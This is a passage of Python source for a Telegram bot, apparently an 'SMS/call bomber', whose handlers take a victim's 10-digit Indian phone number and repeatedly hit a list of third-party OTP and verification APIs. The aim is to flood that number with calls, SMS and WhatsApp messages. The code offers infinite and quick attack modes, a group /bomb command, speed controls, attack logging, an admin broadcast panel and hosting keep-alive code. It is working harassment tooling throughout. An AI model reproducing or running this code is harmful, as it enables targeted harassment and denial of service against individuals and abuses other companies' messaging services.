    user_id = message.from_user.id

    stats = attack_stats.get(user_id, {})
    calls = stats.get('Call', 0)
    sms = stats.get('SMS', 0)
    whatsapp = stats.get('WhatsApp', 0)
    total = calls + sms + whatsapp

    profile_text = f"""
<b>👤 USER PROFILE</b>
━━━━━━━━━━━━━━━━━━━━
<b>ID:</b> <code>{user_id}</code>
<b>Name:</b> {message.from_user.first_name}
<b>Username:</b> @{message.from_user.username if message.from_user.username else 'N/A'}
<b>Status:</b> {'⚡ ACTIVE' if user_id in user_attacks else '💤 IDLE'}

<b>📊 ATTACK STATISTICS:</b>
• 📞 Calls: {calls}
• 📩 SMS: {sms}
• 💬 WhatsApp: {whatsapp}
• 🔥 Total: {total}

<b>🛡️ PROTECTION:</b>
• Protected Numbers: {len(PROTECTED_NUMBERS)}

<b>⚙️ SETTINGS:</b>
• APIs Available: {len(ULTIMATE_APIS)}
• Channel: {'✅ Joined' if not CHANNEL_ID or await check_subscription(user_id) else '❌ Not Joined'}
━━━━━━━━━━━━━━━━━━━━
    """
    await message.answer(profile_text)


@dp.message(F.text == "📊 CHECK STATS")
async def check_stats(message: types.Message):
    user_id = message.from_user.id
    stats = attack_stats.get(user_id, {})

    calls = stats.get('Call', 0)
    sms = stats.get('SMS', 0)
    whatsapp = stats.get('WhatsApp', 0)
    total = calls + sms + whatsapp

    if total == 0:
        stats_text = "<b>📊 NO STATISTICS YET</b>\n\nStart an attack to see statistics!"
    else:
        stats_text = f"""
<b>📊 ATTACK STATISTICS</b>
━━━━━━━━━━━━━━━━━━━━
<b>📞 Voice Calls:</b> {calls}
<b>📩 SMS Messages:</b> {sms}
<b>💬 WhatsApp:</b> {whatsapp}
━━━━━━━━━━━━━━━━━━━━
<b>🔥 TOTAL HITS:</b> {total}
<b>🔄 Cycles:</b> {stats.get('cycles', 0)}
<b>⏰ Last Update:</b> {stats.get('last_update', 'N/A')}
━━━━━━━━━━━━━━━━━━━━
        """

    await message.answer(stats_text, reply_markup=create_stats_keyboard())


@dp.callback_query(F.data == "refresh_stats")
async def refresh_stats_handler(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    stats = attack_stats.get(user_id, {})

    calls = stats.get('Call', 0)
    sms = stats.get('SMS', 0)
    whatsapp = stats.get('WhatsApp', 0)
    total = calls + sms + whatsapp

    if total == 0:
        stats_text = "<b>📊 NO STATISTICS YET</b>\n\nStart an attack to see statistics!"
    else:
        stats_text = f"""
<b>📊 STATISTICS (REFRESHED)</b>
━━━━━━━━━━━━━━━━━━━━
<b>📞 Voice Calls:</b> {calls}
<b>📩 SMS Messages:</b> {sms}
<b>💬 WhatsApp:</b> {whatsapp}
━━━━━━━━━━━━━━━━━━━━
<b>🔥 TOTAL:</b> {total}
<b>⏰ Updated:</b> {time.strftime('%H:%M:%S')}
━━━━━━━━━━━━━━━━━━━━
        """

    await callback.message.edit_text(stats_text, reply_markup=create_stats_keyboard())
    await callback.answer("✅ Statistics refreshed!")


@dp.message(F.text == "🚀 START ATTACK")
async def start_infinite_attack(message: types.Message):
    if CHANNEL_ID and not await check_subscription(message.from_user.id):
        return

    await message.answer(
        "<b>🎯 INFINITE ATTACK MODE</b>\n\n"
        "Enter the 10-digit target number:\n"
        "Example: <code>9876543210</code>\n\n"
        "⚠️ This will run until manually stopped!"
    )


@dp.message(F.text == "⚡ QUICK ATTACK")
async def start_quick_attack(message: types.Message, state: FSMContext):
    if CHANNEL_ID and not await check_subscription(message.from_user.id):
        return

    await message.answer(
        "<b>⚡ QUICK ATTACK MODE</b>\n\n"
        "Enter the 10-digit target number:\n"
        "Example: <code>9876543210</code>\n\n"
        "This will run for limited cycles."
    )
    await state.set_state(AttackState.waiting_for_number)


@dp.message(F.text == "🛑 STOP ATTACK")
async def stop_attack_handler(message: types.Message):
    user_id = message.from_user.id
    if user_id in stop_signals:
        stop_signals[user_id] = True
        await message.answer("🛑 <b>ATTACK STOPPED</b>", reply_markup=create_main_keyboard())
    else:
        await message.answer("No active attack.", reply_markup=create_main_keyboard())


@dp.message(Command("bomb"))
async def cmd_bomb(message: types.Message):
    user_id = message.from_user.id
    if await is_user_banned(user_id):
        return await message.answer("🚫 Banned!")

    args = message.text.split()
    if len(args) < 2:
        return await message.answer("<b>❌ Usage:</b> <code>/bomb 9876543210</code>")

    number = clean_phone_number(args[1])
    if not number or not is_valid_indian_number(number):
        return await message.answer("❌ Invalid number!")

    if number in PROTECTED_NUMBERS:
        return await message.answer("🛡️ Protected number!")

    if not await check_subscription(user_id):
        return await message.answer("🔒 Join channels first!")

    stop_signals[user_id] = False
    user_attacks[user_id] = {'phone': number, 'start_time': time.time(), 'delay': 5}
    attack_stats[user_id] = {'Call': 0, 'SMS': 0, 'WhatsApp': 0, 'cycles': 0}

    msg = await message.answer(
        f"<b>⚔️ BOMBING:</b> <code>{number}</code>\n<b>STATUS:</b> <code>STARTED (Group Mode)</code>",
        reply_markup=create_attack_keyboard()
    )
    await log_attack(user_id, number, "GROUP_CMD")
    asyncio.create_task(run_infinite_attack(user_id, number, message.chat.id, msg.message_id))


@dp.message(AttackState.waiting_for_number)
async def process_quick_attack_number(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    number = clean_phone_number(message.text.strip())

    if not number or not is_valid_indian_number(number):
        await message.answer(
            "<b>❌ INVALID NUMBER!</b>\n"
            "Please enter a valid 10-digit Indian number starting with 6-9."
        )
        return

    if number in PROTECTED_NUMBERS:
        await message.answer(
            f"<b>🛡️ PROTECTED TARGET!</b>\n\n"
            f"Number <code>{number}</code> is in protected list.\n"
            f"Remove protection first to attack."
        )
        await state.clear()
        return

    user_sessions[user_id]["number"] = number

    await message.answer(
        f"<b>✅ NUMBER SET!</b>\n\n"
        f"Target: <code>{number}</code>\n\n"
        f"Select attack mode:",
        reply_markup=create_quick_attack_keyboard()
    )
    await state.clear()


@dp.callback_query(F.data.startswith("cycles_"))
async def handle_cycles_selection(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    if await is_user_banned(user_id):
        return await callback.answer("🚫 You are banned!", show_alert=True)

    cycles = int(callback.data.split("_")[1])

    if user_id not in user_sessions or not user_sessions[user_id]["number"]:
        await callback.answer("❌ No number set!", show_alert=True)
        return

    number = user_sessions[user_id]["number"]

    stop_signals[user_id] = False
    user_attacks[user_id] = {
        'phone': number,
        'start_time': time.time(),
        'delay': 3,
        'max_cycles': cycles,
        'current_cycle': 0,
        'is_quick': True
    }

    attack_stats[user_id] = {
        'Call': 0,
        'SMS': 0,
        'WhatsApp': 0,
        'cycles': 0,
        'last_update': time.strftime('%H:%M:%S')
    }

    await callback.message.edit_text(
        f"<b>⚡ STARTING QUICK ATTACK</b>\n\n"
        f"Target: <code>{number}</code>\n"
        f"Cycles: {cycles}\n"
        f"Mode: QUICK BOMB\n\n"
        "Starting in 3 seconds...",
        reply_markup=None
    )

    await callback.answer(f"Starting {cycles} cycle attack!")

    await log_attack(user_id, number, f"QUICK_{cycles}")
    asyncio.create_task(run_quick_attack(user_id, number, cycles, callback.message.chat.id, callback.message.message_id))


@dp.callback_query(F.data == "quick_bomb")
async def handle_quick_bomb(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    if await is_user_banned(user_id):
        return await callback.answer("🚫 You are banned!", show_alert=True)

    if user_id not in user_sessions or not user_sessions[user_id]["number"]:
        await callback.answer("❌ No number set!", show_alert=True)
        return

    number = user_sessions[user_id]["number"]
    cycles = 15

    stop_signals[user_id] = False
    user_attacks[user_id] = {
        'phone': number,
        'start_time': time.time(),
        'delay': 3,
        'max_cycles': cycles,
        'current_cycle': 0,
        'is_quick': True
    }

    attack_stats[user_id] = {
        'Call': 0,
        'SMS': 0,
        'WhatsApp': 0,
        'cycles': 0,
        'last_update': time.strftime('%H:%M:%S')
    }

    await callback.message.edit_text(
        f"<b>⚡ STARTING QUICK BOMB</b>\n\n"
        f"Target: <code>{number}</code>\n"
        f"Cycles: {cycles}\n"
        f"Mode: QUICK BOMB\n\n"
        "Starting in 3 seconds...",
        reply_markup=None
    )

    await callback.answer("Starting quick bomb!")

    await log_attack(user_id, number, f"QUICK_BOMB_{cycles}")
    asyncio.create_task(run_quick_attack(user_id, number, cycles, callback.message.chat.id, callback.message.message_id))


@dp.message(F.text.regexp(r'^\d{10}$'))
async def handle_attack_number(message: types.Message):
    if message.chat.type != 'private':
        return

    user_id = message.from_user.id
    if await is_user_banned(user_id):
        return await message.answer("<b>🚫 ACCESS DENIED</b>\n\nYou are banned.")

    number = clean_phone_number(message.text.strip())

    if CHANNEL_ID and not await check_subscription(user_id):
        return

    if not number or not is_valid_indian_number(number):
        await message.answer(
            "<b>❌ INVALID NUMBER!</b>\n"
            "Please enter a valid 10-digit Indian number starting with 6-9."
        )
        return

    if number in PROTECTED_NUMBERS:
        await message.answer(
            f"<b>🛡️ PROTECTED TARGET!</b>\n\n"
            f"Number <code>{number}</code> is in protected list.\n"
            f"Remove protection first to attack."
        )
        return

    stop_signals[user_id] = False
    user_attacks[user_id] = {
        'phone': number,
        'start_time': time.time(),
        'delay': 5,
        'is_quick': False
    }
    attack_stats[user_id] = {
        'Call': 0,
        'SMS': 0,
        'WhatsApp': 0,
        'cycles': 0,
        'last_update': time.strftime('%H:%M:%S')
    }

    start_msg = await message.answer(
        "<b>🎯 INITIALIZING INFINITE ATTACK...</b>\n\n"
        f"Target: <code>{number}</code>\n"
        f"APIs: {len(ULTIMATE_APIS)}\n"
        f"Mode: INFINITE\n\n"
        "⚡ Preparing destruction sequence...",
        reply_markup=create_attack_keyboard()
    )

    await animate_message(message.chat.id, start_msg.message_id, f"Target: {number}")

    await log_attack(user_id, number, "INFINITE")
    asyncio.create_task(run_infinite_attack(user_id, number, message.chat.id, start_msg.message_id))


async def run_infinite_attack(user_id, phone, chat_id, message_id):
    stats = attack_stats[user_id]
    attack_info = user_attacks[user_id]
    delay = attack_info['delay']
    cycle_count = 0

    async with aiohttp.ClientSession() as session:
        while not stop_signals.get(user_id, False):
            try:
                cycle_count += 1
                attack_info['cycles'] = cycle_count
                stats['cycles'] = cycle_count

                shuffled_apis = list(ULTIMATE_APIS)
                random.shuffle(shuffled_apis)

                tasks = [hit_api(session, api, phone, stats) for api in shuffled_apis]
                results = await asyncio.gather(*tasks, return_exceptions=True)

                calls = stats.get('Call', 0)
                sms = stats.get('SMS', 0)
                whatsapp = stats.get('WhatsApp', 0)
                total = calls + sms + whatsapp

                stats['last_update'] = time.strftime('%H:%M:%S')

                status_text = f"""
<b>⚔️ INFINITE ATTACK - CYCLE {cycle_count}</b>
━━━━━━━━━━━━━━━━━━━━
<b>🎯 Target:</b> <code>{phone}</code>
<b>⚡ Status:</b> RUNNING
<b>⏱️ Delay:</b> {delay}s

<b>📊 STATISTICS:</b>
• 📞 Calls: {calls}
• 📩 SMS: {sms}
• 💬 WhatsApp: {whatsapp}
• 🔥 Total: {total}

<b>🔄 Next Cycle:</b> {delay}s
<b>⏰ Updated:</b> {stats['last_update']}
━━━━━━━━━━━━━━━━━━━━
                """

                try:
                    await bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=status_text)
                except Exception as e:
                    if "message is not modified" not in str(e) and "message can't be edited" not in str(e):
                        logger.error(f"Failed to update message: {e}")

                if stop_signals.get(user_id, False):
                    break

                await asyncio.sleep(delay)

            except Exception as e:
                logger.error(f"Attack error: {e}")
                await asyncio.sleep(5)

    await finalize_attack(user_id, phone, chat_id, message_id, cycle_count)


async def run_quick_attack(user_id, phone, max_cycles, chat_id, message_id):
    stats = attack_stats[user_id]
    attack_info = user_attacks[user_id]
    delay = attack_info['delay']
    cycle = 0

    async with aiohttp.ClientSession() as session:
        for cycle in range(1, max_cycles + 1):
            if stop_signals.get(user_id, False):
                break

            try:
                attack_info['current_cycle'] = cycle
                stats['cycles'] = cycle

                shuffled_apis = list(ULTIMATE_APIS)
                random.shuffle(shuffled_apis)

                tasks = [hit_api(session, api, phone, stats) for api in shuffled_apis]
                results = await asyncio.gather(*tasks, return_exceptions=True)

                calls = stats.get('Call', 0)
                sms = stats.get('SMS', 0)
                whatsapp = stats.get('WhatsApp', 0)
                total = calls + sms + whatsapp

                stats['last_update'] = time.strftime('%H:%M:%S')

                status_text = f"""
<b>⚡ QUICK ATTACK - CYCLE {cycle}/{max_cycles}</b>
━━━━━━━━━━━━━━━━━━━━
<b>🎯 Target:</b> <code>{phone}</code>
<b>⚡ Status:</b> RUNNING
<b>⏱️ Delay:</b> {delay}s

<b>📊 STATISTICS:</b>
• 📞 Calls: {calls}
• 📩 SMS: {sms}
• 💬 WhatsApp: {whatsapp}
• 🔥 Total: {total}

<b>📈 Progress:</b> {cycle}/{max_cycles} ({int((cycle/max_cycles)*100)}%)
<b>⏰ Updated:</b> {stats['last_update']}
━━━━━━━━━━━━━━━━━━━━
                """

                try:
                    await bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=status_text)
                except Exception as e:
                    if "message is not modified" not in str(e) and "message can't be edited" not in str(e):
                        logger.error(f"Failed to update message: {e}")

                if stop_signals.get(user_id, False):
                    break

                await asyncio.sleep(delay)

            except Exception as e:
                logger.error(f"Attack error: {e}")
                await asyncio.sleep(2)

    await finalize_attack(user_id, phone, chat_id, message_id, min(cycle, max_cycles))


async def finalize_attack(user_id, phone, chat_id, message_id, cycles_completed):
    final_stats = attack_stats.get(user_id, {})
    calls = final_stats.get('Call', 0)
    sms = final_stats.get('SMS', 0)
    whatsapp = final_stats.get('WhatsApp', 0)
    total = calls + sms + whatsapp

    attack_info = user_attacks.get(user_id, {})
    duration = time.time() - attack_info.get('start_time', time.time())

    mode_text = "QUICK ATTACK" if attack_info.get('is_quick', False) else "INFINITE ATTACK"

    final_text = f"""
<b>✅ ATTACK COMPLETED</b>
━━━━━━━━━━━━━━━━━━━━
<b>🎯 Target:</b> <code>{phone}</code>
<b>🎯 Mode:</b> {mode_text}
<b>🔄 Cycles:</b> {cycles_completed}
<b>⏱️ Duration:</b> {duration:.1f}s

<b>📊 FINAL STATISTICS:</b>
• 📞 Calls: {calls}
• 📩 SMS: {sms}
• 💬 WhatsApp: {whatsapp}
• 🔥 Total: {total}

<b>🏁 Status:</b> COMPLETED
<b>⏰ Time:</b> {time.strftime('%H:%M:%S')}
━━━━━━━━━━━━━━━━━━━━
    """

    try:
        await bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=final_text)
    except:
        pass

    if user_id in stop_signals:
        del stop_signals[user_id]
    if user_id in user_attacks:
        del user_attacks[user_id]


@dp.message(F.text == "🛑 STOP ATTACK")
async def stop_attack(message: types.Message):
    user_id = message.from_user.id

    if user_id in stop_signals:
        stop_signals[user_id] = True
        await message.answer(
            "<b>🛑 STOPPING ATTACK...</b>\n\n"
            "Current cycle will complete and stop.",
            reply_markup=create_main_keyboard()
        )
    else:
        await message.answer(
            "<b>ℹ️ NO ACTIVE ATTACK</b>\n\n"
            "There's no attack to stop.",
            reply_markup=create_main_keyboard()
        )


@dp.message(F.text == "📊 LIVE STATS")
async def live_stats(message: types.Message):
    user_id = message.from_user.id

    if user_id in attack_stats:
        stats = attack_stats[user_id]
        calls = stats.get('Call', 0)
        sms = stats.get('SMS', 0)
        whatsapp = stats.get('WhatsApp', 0)
        total = calls + sms + whatsapp

        if user_id in user_attacks:
            attack_info = user_attacks[user_id]
            mode = "QUICK" if attack_info.get('is_quick') else "INFINITE"
            cycles = attack_info.get('cycles', 0) if not attack_info.get('is_quick') else f"{attack_info.get('current_cycle', 0)}/{attack_info.get('max_cycles', 0)}"
            status = "ACTIVE"
        else:
            mode = "NONE"
            cycles = 0
            status = "STOPPED"

        live_text = f"""
<b>📊 LIVE STATISTICS</b>
━━━━━━━━━━━━━━━━━━━━
<b>📞 Calls:</b> {calls}
<b>📩 SMS:</b> {sms}
<b>💬 WhatsApp:</b> {whatsapp}
<b>🔥 Total:</b> {total}

<b>⚡ Mode:</b> {mode}
<b>🔄 Cycles:</b> {cycles}
<b>📈 Status:</b> {status}
<b>⏰ Updated:</b> {stats.get('last_update', 'N/A')}
━━━━━━━━━━━━━━━━━━━━
        """
    else:
        live_text = "<b>📭 NO ACTIVE ATTACK</b>\n\nStart an attack to see live statistics."

    await message.answer(live_text)


@dp.message(F.text == "⚡ SPEED UP")
async def speed_up(message: types.Message):
    user_id = message.from_user.id

    if user_id in user_attacks and user_attacks[user_id]['delay'] > 1:
        user_attacks[user_id]['delay'] = max(1, user_attacks[user_id]['delay'] - 2)
        new_delay = user_attacks[user_id]['delay']
        await message.answer(f"<b>⚡ SPEED INCREASED!</b>\n\nDelay: {new_delay}s")
    else:
        await message.answer("<b>⚠️ CAN'T GO FASTER!</b>\n\nMinimum delay reached.")


@dp.message(F.text == "🐢 SLOW DOWN")
async def slow_down(message: types.Message):
    user_id = message.from_user.id

    if user_id in user_attacks:
        user_attacks[user_id]['delay'] = min(30, user_attacks[user_id]['delay'] + 5)
        new_delay = user_attacks[user_id]['delay']
        await message.answer(f"<b>🐢 SPEED DECREASED!</b>\n\nDelay: {new_delay}s")
    else:
        await message.answer("<b>ℹ️ NO ACTIVE ATTACK</b>")


@dp.message(F.text == "🏠 MAIN MENU")
async def main_menu(message: types.Message):
    user_id = message.from_user.id

    if user_id in stop_signals:
        stop_signals[user_id] = True

    await message.answer(
        "<b>🏠 MAIN MENU</b>\n\nSelect an option:",
        reply_markup=create_main_keyboard()
    )


@dp.message(Command("stop"))
async def stop_command(message: types.Message):
    await stop_attack(message)


@dp.message(Command("stats"))
async def stats_command(message: types.Message):
    await check_stats(message)


@dp.message(Command("help"))
async def help_command(message: types.Message):
    await show_help(message)


@dp.message(Command("profile"))
async def profile_command(message: types.Message):
    await show_profile(message)


@dp.message(Command("protected"))
async def protected_command(message: types.Message):
    if not PROTECTED_NUMBERS:
        await message.answer("<b>📭 No Protected Numbers</b>\n\nYou haven't protected any numbers yet.")
        return

    protected_list = "\n".join([f"• <code>{num}</code>" for num in PROTECTED_NUMBERS])
    await message.answer(
        f"<b>🛡️ PROTECTED NUMBERS</b>\n\n"
        f"Total: {len(PROTECTED_NUMBERS)}\n\n"
        f"{protected_list}"
    )


@dp.message(Command("admin"))
async def show_admin_panel(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        return await message.answer("❌ You are not authorized!")

    await message.answer(
        "<b>👨‍💻 ADVANCED ADMIN PANEL</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "System: PRO v4.0\n"
        "Database: SUPABASE CLOUD\n"
        "Status: ONLINE ✅\n"
        "━━━━━━━━━━━━━━━━━━━━",
        reply_markup=create_admin_keyboard()
    )


@dp.callback_query(F.data == "adm_stats")
async def adm_stats_handler(callback: types.CallbackQuery):
    u_count, a_count = await get_db_stats()
    await callback.message.edit_text(
        f"<b>📊 GLOBAL STATISTICS</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"Total Users: <code>{u_count}</code>\n"
        f"Total Attacks: <code>{a_count}</code>\n"
        f"Active Sessions: <code>{len(user_attacks)}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━",
        reply_markup=create_admin_keyboard()
    )


@dp.callback_query(F.data == "adm_bc")
async def adm_bc_init(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.answer("📢 Enter broadcast message:")
    await state.set_state(AdminState.waiting_for_broadcast)


@dp.message(AdminState.waiting_for_broadcast)
async def process_broadcast(message: types.Message, state: FSMContext):
    await state.clear()
    msg = message.text
    try:
        users = supabase.table("users").select("id").execute().data
        count = 0
        for u in users:
            try:
                await bot.send_message(u["id"], f"<b>📢 BROADCAST MESSAGE</b>\n\n{msg}")
                count += 1
                await asyncio.sleep(0.05)
            except:
                pass
        await message.answer(f"✅ Broadcast sent to {count} users.")
    except Exception as e:
        await message.answer(f"❌ Failed: {e}")


@dp.message()
async def handle_other_messages(message: types.Message):
    user_id = message.from_user.id
    text = message.text

    attack_controls = ["🛑 STOP ATTACK", "📊 LIVE STATS", "⚡ SPEED UP", "🐢 SLOW DOWN", "🏠 MAIN MENU"]

    if message.chat.type != 'private':
        if text not in attack_controls:
            return

    if text and not text.startswith('/'):
        if text == "🛑 STOP ATTACK":
            return await stop_attack(message)
        elif text == "📊 LIVE STATS":
            return await live_stats(message)
        elif text == "⚡ SPEED UP":
            return await speed_up(message)
        elif text == "🐢 SLOW DOWN":
            return await slow_down(message)
        elif text == "🏠 MAIN MENU":
            return await main_menu(message)

        cleaned = clean_phone_number(text)
        if cleaned and is_valid_indian_number(cleaned):
            if message.chat.type == 'private':
                await message.answer(
                    "<b>📱 NUMBER DETECTED!</b>\n\n"
                    f"Detected: <code>{cleaned}</code>\n\n"
                    "Please select attack mode from the menu.",
                    reply_markup=create_main_keyboard()
                )
        else:
            if message.chat.type == 'private':
                await message.answer(
                    "<b>❓ UNKNOWN COMMAND</b>\n\n"
                    "Use /help for instructions or select from menu.",
                    reply_markup=create_main_keyboard()
                )


# --- WEB SERVER & LIFECYCLE ---
async def handle_ping(request):
    return web.Response(text="Bot is ALIVE!")


async def handle_ping_head(request):
    return web.Response(text="")


async def start_web_server():
    app = web.Application()
    app.router.add_get("/", handle_ping)
    app.router.add_head("/", handle_ping_head)
    app.router.add_get("/health", handle_ping)

    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    logger.info(f"🚀 Web server started on 0.0.0.0:{port}")
    return runner


shutdown_event = asyncio.Event()


def _signal_handler(sig_name):
    logger.info(f"🛑 Received {sig_name}, shutting down...")
    shutdown_event.set()


async def main():
    """Main entry point — safe for Railway restarts"""
    web_runner = await start_web_server()

    logger.info("=" * 50)
    logger.info("🚀 Starting ULTIMATE BOMBER BOT v3.0")
    logger.info(f"👨‍💻 Developer: {DEVELOPER_ID}")
    logger.info(f"📊 Total APIs: {len(ULTIMATE_APIS)}")
    logger.info(f"   • Call APIs: {len([a for a in ULTIMATE_APIS if a['type'] == 'Call'])}")
    logger.info(f"   • SMS APIs: {len([a for a in ULTIMATE_APIS if a['type'] == 'SMS'])}")
    logger.info(f"   • WhatsApp APIs: {len([a for a in ULTIMATE_APIS if a['type'] == 'WhatsApp'])}")
    logger.info(f"📢 Channel check: {'Enabled' if CHANNEL_ID else 'Disabled'}")
    logger.info("=" * 50)

    loop = asyncio.get_running_loop()
    for sig in (signal.SIGTERM, signal.SIGINT):
        try:
            loop.add_signal_handler(sig, _signal_handler, sig.name)
        except NotImplementedError:
            signal.signal(sig, lambda s, f: _signal_handler(s.name))

    await bot.delete_webhook(drop_pending_updates=True)

    try:
        polling_task = asyncio.create_task(dp.start_polling(bot))
        shutdown_task = asyncio.create_task(shutdown_event.wait())

        done, pending = await asyncio.wait(
            {polling_task, shutdown_task},
            return_when=asyncio.FIRST_COMPLETED,
        )

        if polling_task in pending:
            polling_task.cancel()
            try:
                await polling_task
            except asyncio.CancelledError:
                pass
    except Exception as e:
        logger.exception(f"Polling crashed: {e}")
    finally:
        try:
            await dp.storage.close()
        except Exception:
            pass
        try:
            await bot.session.close()
        except Exception:
            pass
        try:
            await web_runner.cleanup()
        except Exception:
            pass
        logger.info("✅ Shutdown complete.")


if __name__ == "__main__":
    while True:
        try:
            asyncio.run(main())
            break
        except KeyboardInterrupt:
            logger.info("Interrupted by user.")
            break
        except Exception as e:
            logger.exception(f"Fatal error: {e}. Restarting in 5s...")
            time.sleep(5)